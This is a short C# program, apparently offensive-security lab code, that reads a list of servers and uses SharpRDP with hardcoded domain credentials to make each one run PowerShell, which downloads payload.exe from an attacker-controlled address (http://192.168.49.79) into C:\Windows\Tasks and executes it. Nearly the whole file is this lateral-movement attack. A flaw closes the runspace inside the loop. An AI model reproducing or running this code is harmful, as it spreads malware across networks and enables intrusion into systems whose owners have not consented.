using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;

//Make sure to add reference for System.Mangement.Automation.

namespace UploadExec
{
    class Program
    {
        static void Main(string[] args)
        {

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            string[] lines = System.IO.File.ReadAllLines(@"C:\servers.txt");

            foreach (string line in lines)
            {
                String cmd = "SharpRDP.exe computername=" + line + "command='powershell(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.79/payload.exe', 'C:\\Windows\\Tasks\\payload.exe'); C:\\Windows\\Tasks\\payload.exe' username=domain\\user password=pass";
                Console.WriteLine(cmd);
                ps.AddScript(cmd);
                ps.Invoke();
                rs.Close();
            }
        }
    }
}
